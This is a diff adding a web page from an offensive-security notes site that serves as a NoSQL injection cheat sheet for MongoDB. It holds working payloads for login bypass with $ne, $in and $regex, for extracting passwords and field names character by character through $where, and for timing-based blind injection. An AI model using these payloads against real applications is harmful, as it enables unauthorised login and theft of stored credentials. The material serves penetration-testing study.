@@ -1,0 +1,305 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>offsecnotes | NoSQL injection</title>
+  <link rel="icon" type="image/png" href="/static/favicon.png">
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@exampledev/new.css@1.1.2/new.min.css">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.11.1/styles/github.min.css" media="(prefers-color-scheme: light)" data-theme-css="light">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.11.1/styles/github-dark.min.css" media="(prefers-color-scheme: dark)" data-theme-css="dark">
+  <link rel="stylesheet" href="/static/style.css">
+  <script>
+    // Theme: saved choice (light/dark) or, if none, the system preference.
+    // Runs before the page is drawn, so there's no flash of the wrong theme.
+    function setTheme(theme) {
+      document.documentElement.dataset.theme = theme;
+      document.querySelectorAll("link[data-theme-css]").forEach(function (link) {
+        link.media = link.dataset.themeCss === theme ? "all" : "not all";
+      });
+    }
+    function toggleTheme() {
+      var current = document.documentElement.dataset.theme ||
+        (matchMedia("(prefers-color-scheme: dark)").matches ? "dark" : "light");
+      var next = current === "dark" ? "light" : "dark";
+      setTheme(next);
+      try { localStorage.setItem("theme", next); } catch (e) {}
+    }
+    try { var saved = localStorage.getItem("theme"); if (saved) setTheme(saved); } catch (e) {}
+  </script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.11.1/highlight.min.js"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.11.1/languages/go.min.js"></script>
+  <script>hljs.highlightAll();</script>
+</head>
+<body>
+  <header>
+    <div class="header-top">
+      <h1>offsecnotes</h1>
+      <button class="theme-toggle" onclick="toggleTheme()" aria-label="Toggle light/dark theme" title="Toggle theme"></button>
+    </div>
+    <nav>
+      <a href="/">Home</a> • <a href="/Android/">Android</a> • <a href="/Web/">Web</a> •
+      <a href="/Network/">Network</a> • <a href="/Linux/">Linux</a> •
+      <a href="/Windows/">Windows</a> • <a href="/Misc/">Misc</a>
+    </nav>
+  </header>
+  <h1>NoSQL injection</h1>
+  <span>by frankheat</span>
+  <div class="toc"><ul>
+<li><a href="#types-of-nosql-injection" id="toc-types-of-nosql-injection">Types of NoSQL injection</a></li>
+<li><a href="#nosql-syntax-injection" id="toc-nosql-syntax-injection">NoSQL syntax injection</a>
+<ul>
+<li><a href="#confirming-conditional-behavior" id="toc-confirming-conditional-behavior">Confirming conditional behavior</a></li>
+<li><a href="#overriding-existing-conditions" id="toc-overriding-existing-conditions">Overriding existing conditions</a></li>
+</ul></li>
+<li><a href="#nosql-operator-injection" id="toc-nosql-operator-injection">NoSQL operator injection</a>
+<ul>
+<li><a href="#testing" id="toc-testing">Testing</a></li>
+</ul></li>
+<li><a href="#extract-data" id="toc-extract-data">Extract data</a></li>
+<li><a href="#identify-field-names" id="toc-identify-field-names">Identify field names</a></li>
+<li><a href="#timing-based-injection" id="toc-timing-based-injection">Timing based injection</a></li>
+</ul></div>
+  <hr>
+<details>
+<summary>
+Introduction to NoSQL databases
+</summary>
+<p><strong>NoSQL databases</strong></p>
+<ul>
+<li>They are designed to handle large volumes of unstructured or semi-structured data.
+<ul>
+<li>benefits in terms of scalability, flexibility, and performance</li>
+</ul></li>
+<li>Like SQL databases, users interact with data in NoSQL databases using queries but many NoSQL databases use a wide range of query languages instead of a universal standard like SQL (ex. JSON, XML)</li>
+</ul>
+<p><strong>NoSQL database models</strong></p>
+<ul>
+<li>Document stores - These store data in flexible, semi-structured documents. They typically use formats such as JSON, BSON, and XML, and are queried in an API or query language. Examples include MongoDB and Couchbase.</li>
+<li>Key-value stores - These store data in a key-value format. Each data field is associated with a unique key string. Values are retrieved based on the unique key. Examples include Redis and Amazon DynamoDB.</li>
+<li>Wide-column stores - These organize related data into flexible column families rather than traditional rows. Examples include Apache Cassandra and Apache HBase.</li>
+<li>Graph databases - These use nodes to store data entities, and edges to store relationships between entities. Examples include Neo4j and Amazon Neptune.</li>
+</ul>
+</details>
+<hr />
+<h2 id="types-of-nosql-injection">Types of NoSQL injection</h2>
+<ol type="1">
+<li>Syntax injection - when you can break the NoSQL query syntax, enabling the injection (likeSQLi).</li>
+<li>Operator injection - when you can use NoSQL query operators to manipulate queries.</li>
+</ol>
+<hr />
+<h2 id="nosql-syntax-injection">NoSQL syntax injection</h2>
+<ul>
+<li>Consider: <code>https://insecure-website.com/product/lookup?category=fizzy</code></li>
+<li>This causes the application to send a JSON query to retrieve relevant products from the <code>product</code> collection in the MongoDB database:
+<ul>
+<li><code>this.category == 'fizzy'</code></li>
+</ul></li>
+<li>Inject: <code>'</code> -&gt; <code>this.category == '''</code>
+<ul>
+<li>If this causes a change from the original response, this may indicate that the <code>'</code> character has broken the query syntax and caused a syntax error.</li>
+</ul></li>
+<li>Confirm this by submitting a valid query string in the input, e.g.: <code>\'</code> -&gt; <code>this.category == '\''</code>
+<ul>
+<li>If this doesn’t cause a syntax error, this may mean that the application is vulnerable to an injection attack.</li>
+</ul></li>
+</ul>
+<h3 id="confirming-conditional-behavior">Confirming conditional behavior</h3>
+<div class="sourceCode" id="cb1"><pre class="sourceCode markdown"><code class="sourceCode markdown"><span id="cb1-1"><a href="#cb1-1" aria-hidden="true" tabindex="-1"></a><span class="fu"># False condition</span></span>
+<span id="cb1-2"><a href="#cb1-2" aria-hidden="true" tabindex="-1"></a>&#39; &amp;&amp; 0 &amp;&amp; &#39;x</span>
+<span id="cb1-3"><a href="#cb1-3" aria-hidden="true" tabindex="-1"></a>&#39; &amp;&amp; &#39;1&#39;==&#39;2</span>
+<span id="cb1-4"><a href="#cb1-4" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb1-5"><a href="#cb1-5" aria-hidden="true" tabindex="-1"></a><span class="fu"># True condition</span></span>
+<span id="cb1-6"><a href="#cb1-6" aria-hidden="true" tabindex="-1"></a>&#39; &amp;&amp; 1 &amp;&amp; &#39;x </span>
+<span id="cb1-7"><a href="#cb1-7" aria-hidden="true" tabindex="-1"></a>&#39; &amp;&amp; &#39;1&#39;==&#39;1</span></code></pre></div>
+<pre><code>https://insecure-website.com/product/lookup?category=fizzy&#39;+%26%26+0+%26%26+&#39;x
+https://insecure-website.com/product/lookup?category=fizzy&#39;+%26%26+1+%26%26+&#39;x</code></pre>
+<p>If the application behaves differently suggests that the false condition impacts the query logic, but the true condition doesn’t.</p>
+<h3 id="overriding-existing-conditions">Overriding existing conditions</h3>
+<div class="sourceCode" id="cb3"><pre class="sourceCode markdown"><code class="sourceCode markdown"><span id="cb3-1"><a href="#cb3-1" aria-hidden="true" tabindex="-1"></a><span class="fu"># Always true: </span></span>
+<span id="cb3-2"><a href="#cb3-2" aria-hidden="true" tabindex="-1"></a>&#39;||1||&#39;</span>
+<span id="cb3-3"><a href="#cb3-3" aria-hidden="true" tabindex="-1"></a>&#39;||&#39;1&#39;==&#39;1&#39;</span>
+<span id="cb3-4"><a href="#cb3-4" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb3-5"><a href="#cb3-5" aria-hidden="true" tabindex="-1"></a><span class="fu"># Inject: fizzy&#39;||1||&#39;</span></span>
+<span id="cb3-6"><a href="#cb3-6" aria-hidden="true" tabindex="-1"></a>https://insecure-website.com/product/lookup?category=fizzy%27%7c%7c%31%7c%7c%27</span>
+<span id="cb3-7"><a href="#cb3-7" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb3-8"><a href="#cb3-8" aria-hidden="true" tabindex="-1"></a><span class="fu"># Back-end code</span></span>
+<span id="cb3-9"><a href="#cb3-9" aria-hidden="true" tabindex="-1"></a>this.category == &#39;fizzy&#39;||1||&#39;&#39;</span></code></pre></div>
+<p>The modified query returns all items (all the products in any category).</p>
+<blockquote>
+<p><strong>Wwarning</strong>: If an application uses it when updating or deleting data, for example, this can result in accidental data loss.</p>
+</blockquote>
+<p><strong>Null character</strong></p>
+<p>MongoDB may ignore all characters after a null character. This means that any additional conditions on the MongoDB query are ignored.</p>
+<div class="sourceCode" id="cb4"><pre class="sourceCode markdown"><code class="sourceCode markdown"><span id="cb4-1"><a href="#cb4-1" aria-hidden="true" tabindex="-1"></a><span class="fu"># Back-end code</span></span>
+<span id="cb4-2"><a href="#cb4-2" aria-hidden="true" tabindex="-1"></a>this.category == &#39;fizzy&#39; &amp;&amp; this.released == 1</span>
+<span id="cb4-3"><a href="#cb4-3" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb4-4"><a href="#cb4-4" aria-hidden="true" tabindex="-1"></a><span class="fu"># Inject null char</span></span>
+<span id="cb4-5"><a href="#cb4-5" aria-hidden="true" tabindex="-1"></a>https://insecure-website.com/product/lookup?category=fizzy&#39;%00</span>
+<span id="cb4-6"><a href="#cb4-6" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb4-7"><a href="#cb4-7" aria-hidden="true" tabindex="-1"></a><span class="fu"># Back-end code result [removes the req for the released field to be set to 1]</span></span>
+<span id="cb4-8"><a href="#cb4-8" aria-hidden="true" tabindex="-1"></a>this.category == &#39;fizzy&#39;\u0000&#39; &amp;&amp; this.released == 1</span></code></pre></div>
+<hr />
+<h2 id="nosql-operator-injection">NoSQL operator injection</h2>
+<details>
+<summary>
+Examples of MongoDB query operators
+</summary>
+<ul>
+<li><p><code>$where</code> - Matches documents that satisfy a JavaScript expression.</p></li>
+<li><p><code>$ne</code> - Matches all values that are not equal to a specified value.</p></li>
+<li><p><code>$in</code> - Matches all of the values specified in an array.</p></li>
+<li><p><code>$regex</code> - Selects documents where values match a specified regular expression.</p></li>
+</ul>
+<p>MongoDB Query and Projection Operators: <a href="https://www.mongodb.com/docs/manual/reference/operator/query/">https://www.mongodb.com/docs/manual/reference/operator/query/</a></p>
+</details>
+<ul>
+<li>JSON example:
+<ul>
+<li><code>{"username":"wiener"}</code> -&gt; <code>{"username":{"$ne":"invalid"}}</code></li>
+</ul></li>
+<li>URL parameters:
+<ul>
+<li><code>username=wiener</code> -&gt; <code>username[$ne]=invalid</code></li>
+</ul></li>
+</ul>
+<hr />
+<ul>
+<li>If this doesn’t work, you can try the following (or use Content Type Converter burp exts):
+<ol type="1">
+<li>Convert the request method from <code>GET</code> to <code>POST</code>.</li>
+<li>Change the <code>Content-Type</code> header to <code>application/json</code>.</li>
+<li>Add JSON to the message body.</li>
+<li>Inject query operators in the JSON.</li>
+</ol></li>
+</ul>
+<h3 id="testing">Testing</h3>
+<div class="sourceCode" id="cb5"><pre class="sourceCode markdown"><code class="sourceCode markdown"><span id="cb5-1"><a href="#cb5-1" aria-hidden="true" tabindex="-1"></a><span class="fu"># Login bypass</span></span>
+<span id="cb5-2"><a href="#cb5-2" aria-hidden="true" tabindex="-1"></a>{&quot;username&quot;:&quot;bob&quot;,&quot;password&quot;:{&quot;$ne&quot;:&quot;invalid&quot;}}</span>
+<span id="cb5-3"><a href="#cb5-3" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb5-4"><a href="#cb5-4" aria-hidden="true" tabindex="-1"></a><span class="fu"># Guess with usernames list</span></span>
+<span id="cb5-5"><a href="#cb5-5" aria-hidden="true" tabindex="-1"></a>{&quot;username&quot;:{&quot;$in&quot;:<span class="co">[</span><span class="ot">&quot;admin&quot;,&quot;administrator&quot;,&quot;superadmin&quot;</span><span class="co">]</span>},&quot;password&quot;:{&quot;$ne&quot;:&quot;&quot;}}</span>
+<span id="cb5-6"><a href="#cb5-6" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb5-7"><a href="#cb5-7" aria-hidden="true" tabindex="-1"></a><span class="fu"># Guess with regex</span></span>
+<span id="cb5-8"><a href="#cb5-8" aria-hidden="true" tabindex="-1"></a>{&quot;username&quot;:{&quot;$regex&quot;:&quot;^adm&quot;},&quot;password&quot;:{&quot;$ne&quot;:&quot;&quot;}}</span></code></pre></div>
+<p><strong>Other tests</strong></p>
+<ul>
+<li>Example:<code>{"username":"wiener","password":"peter"}</code></li>
+<li><code>{"username":{"$ne":"invalid"},"password":{"$ne":"invalid"}}</code></li>
+<li>This query returns all login credentials where both the username and password are not equal to <code>invalid</code>. As a result, you’re logged into the application as the first user in the collection.</li>
+</ul>
+<hr />
+<h2 id="extract-data">Extract data</h2>
+<p><strong>INSIDE $WHERE</strong></p>
+<ul>
+<li>Consider <code>https://insecure-website.com/user/lookup?username=admin</code></li>
+<li>This results in the following NoSQL query of the <code>users</code> collection: <code>{"$where":"this.username == 'admin'"}</code></li>
+<li>As the query uses the <code>$where</code> operator, you can attempt to inject JavaScript functions.
+<ul>
+<li><code>admin' &amp;&amp; this.password[0] == 'a' || 'a'=='b</code>
+<ul>
+<li>This returns the first character of the user’s password string. You can go on…</li>
+</ul></li>
+<li><code>admin' &amp;&amp; this.password.match(/\d/) || 'a'=='b</code>
+<ul>
+<li>Identify whether the password contains digits</li>
+</ul></li>
+</ul></li>
+</ul>
+<hr />
+<p><strong>INJECT OPERATOR (where)</strong></p>
+<ul>
+<li>Consider <code>{"username":"wiener","password":"peter"}</code></li>
+<li>Add <code>$where</code> operator as an additional parameter. Send one true request and one false request.
+<ul>
+<li><code>{"username":"wiener","password":"peter", "$where":"0"}</code></li>
+<li><code>{"username":"wiener","password":"peter", "$where":"1"}</code></li>
+<li>Different responses? This may indicate that the JavaScript expression in the <code>$where</code> clause is being evaluated</li>
+</ul></li>
+</ul>
+<hr />
+<p><strong>INJECT OPERATOR (regex)</strong></p>
+<ul>
+<li>Consider <code>{"username":"myuser","password":"mypass"}</code>
+<ul>
+<li><code>{"username":"myuser","password":"incorrect"}</code> (incorrect password)</li>
+<li><code>{"username":"admin","password":{"$regex":"^.*"}}</code></li>
+<li>Different responses? The app may be vulnerable</li>
+</ul></li>
+<li><code>{"username":"admin","password":{"$regex":"^a*"}}</code>
+<ul>
+<li>Extract data character by character</li>
+</ul></li>
+</ul>
+<hr />
+<h2 id="identify-field-names">Identify field names</h2>
+<p><strong>FIRST WAY</strong></p>
+<ul>
+<li>Send the payload for an existing field and for a field that doesn’t exist.</li>
+<li>Example
+<ul>
+<li><code>admin' &amp;&amp; this.username!='</code> (you know <code>username</code> field exists)</li>
+<li><code>admin' &amp;&amp; this.foo!='</code> (you know <code>foo</code> field doesn’t exist)</li>
+<li><code>admin' &amp;&amp; this.password!='</code> (you want identify <code>password</code> field)
+<ul>
+<li><code>https://insecure-website.com/user/lookup?username=admin'+%26%26+this.password!%3d'</code></li>
+</ul></li>
+</ul></li>
+<li>If the <code>password</code> field exists, you’d expect the response to be identical to the response for the existing field (<code>username</code>), but different to the response for the field that doesn’t exist (<code>foo</code>).</li>
+</ul>
+<hr />
+<p><strong>SECOND WAY</strong></p>
+<ul>
+<li>You can inject operator?
+<ul>
+<li><code>"$where":"Object.keys(this)[0].match('^.{0}a.*')"</code></li>
+<li>This query selects documents where the first key (field) of the document starts with the letter “a”. You can extract the field name char by char</li>
+</ul></li>
+</ul>
+<details>
+<summary>
+Example
+</summary>
+<div class="sourceCode" id="cb6"><pre class="sourceCode json"><code class="sourceCode json"><span id="cb6-1"><a href="#cb6-1" aria-hidden="true" tabindex="-1"></a><span class="fu">{</span></span>
+<span id="cb6-2"><a href="#cb6-2" aria-hidden="true" tabindex="-1"></a><span class="dt">&quot;username&quot;</span><span class="fu">:</span><span class="st">&quot;test&quot;</span><span class="fu">,</span></span>
+<span id="cb6-3"><a href="#cb6-3" aria-hidden="true" tabindex="-1"></a><span class="dt">&quot;$where&quot;</span><span class="fu">:</span><span class="st">&quot;Object.keys(this)[§1§].match(&#39;^.{0}§u§.*&#39;)&quot;</span></span>
+<span id="cb6-4"><a href="#cb6-4" aria-hidden="true" tabindex="-1"></a><span class="fu">}</span></span></code></pre></div>
+<p>With intruder set: 1 payload: numbers, 2 payload: bruteforce chars.</p>
+<p>You have :</p>
+<div class="sourceCode" id="cb7"><pre class="sourceCode json"><code class="sourceCode json"><span id="cb7-1"><a href="#cb7-1" aria-hidden="true" tabindex="-1"></a><span class="ot">[</span></span>
+<span id="cb7-2"><a href="#cb7-2" aria-hidden="true" tabindex="-1"></a>    <span class="fu">{</span> <span class="dt">&quot;apple&quot;</span><span class="fu">:</span> <span class="st">&quot;fruit&quot;</span><span class="fu">,</span> <span class="dt">&quot;color&quot;</span><span class="fu">:</span> <span class="st">&quot;red&quot;</span> <span class="fu">}</span><span class="ot">,</span></span>
+<span id="cb7-3"><a href="#cb7-3" aria-hidden="true" tabindex="-1"></a>    <span class="fu">{</span> <span class="dt">&quot;banana&quot;</span><span class="fu">:</span> <span class="st">&quot;fruit&quot;</span><span class="fu">,</span> <span class="dt">&quot;color&quot;</span><span class="fu">:</span> <span class="st">&quot;yellow&quot;</span> <span class="fu">}</span><span class="ot">,</span></span>
+<span id="cb7-4"><a href="#cb7-4" aria-hidden="true" tabindex="-1"></a>    <span class="fu">{</span> <span class="dt">&quot;avocado&quot;</span><span class="fu">:</span> <span class="st">&quot;fruit&quot;</span><span class="fu">,</span> <span class="dt">&quot;color&quot;</span><span class="fu">:</span> <span class="st">&quot;green&quot;</span> <span class="fu">}</span><span class="ot">,</span></span>
+<span id="cb7-5"><a href="#cb7-5" aria-hidden="true" tabindex="-1"></a>    <span class="fu">{</span> <span class="dt">&quot;berry&quot;</span><span class="fu">:</span> <span class="st">&quot;fruit&quot;</span><span class="fu">,</span> <span class="dt">&quot;color&quot;</span><span class="fu">:</span> <span class="st">&quot;blue&quot;</span> <span class="fu">}</span></span>
+<span id="cb7-6"><a href="#cb7-6" aria-hidden="true" tabindex="-1"></a><span class="ot">]</span></span></code></pre></div>
+<p>Query</p>
+<div class="sourceCode" id="cb8"><pre class="sourceCode javascript"><code class="sourceCode javascript"><span id="cb8-1"><a href="#cb8-1" aria-hidden="true" tabindex="-1"></a>db<span class="op">.</span><span class="at">collection</span><span class="op">.</span><span class="fu">find</span>({ <span class="st">&quot;$where&quot;</span><span class="op">:</span> <span class="st">&quot;Object.keys(this)[0].match(&#39;^.{0}a.*&#39;)&quot;</span> })</span></code></pre></div>
+<div class="sourceCode" id="cb9"><pre class="sourceCode json"><code class="sourceCode json"><span id="cb9-1"><a href="#cb9-1" aria-hidden="true" tabindex="-1"></a><span class="ot">[</span></span>
+<span id="cb9-2"><a href="#cb9-2" aria-hidden="true" tabindex="-1"></a>    <span class="fu">{</span> <span class="dt">&quot;apple&quot;</span><span class="fu">:</span> <span class="st">&quot;fruit&quot;</span><span class="fu">,</span> <span class="dt">&quot;color&quot;</span><span class="fu">:</span> <span class="st">&quot;red&quot;</span> <span class="fu">}</span><span class="ot">,</span></span>
+<span id="cb9-3"><a href="#cb9-3" aria-hidden="true" tabindex="-1"></a>    <span class="fu">{</span> <span class="dt">&quot;avocado&quot;</span><span class="fu">:</span> <span class="st">&quot;fruit&quot;</span><span class="fu">,</span> <span class="dt">&quot;color&quot;</span><span class="fu">:</span> <span class="st">&quot;green&quot;</span> <span class="fu">}</span></span>
+<span id="cb9-4"><a href="#cb9-4" aria-hidden="true" tabindex="-1"></a><span class="ot">]</span></span></code></pre></div>
+</details>
+<hr />
+<h2 id="timing-based-injection">Timing based injection</h2>
+<p>Database error doesn’t cause a difference in the application’s response? Trigger a conditional time delay</p>
+<ol type="1">
+<li>Load the page several times to determine a baseline loading time.</li>
+<li>Insert a timing based payload into the input. Example <code>{"$where": "sleep(5000)"}</code></li>
+<li>Identify whether the response loads more slowly</li>
+</ol>
+<ul>
+<li>Trigger a time delay if the password beings with the letter <code>a</code>
+<ul>
+<li><code>admin'+function(x){var waitTill = new Date(new Date().getTime() + 5000);while((x.password[0]==="a") &amp;&amp; waitTill &gt; new Date()){};}(this)+'</code></li>
+<li><code>admin'+function(x){if(x.password[0]==="a"){sleep(5000)};}(this)+'</code></li>
+</ul></li>
+</ul>
+  <hr>
+  <footer>
+    <p align="center">
+      <a href="https://github.com/frankheat/offsecnotes">Source code</a> •
+      <a href="https://github.com/frankheat">frankheat</a>
+    </p>
+  </footer>
+</body>
+</html>
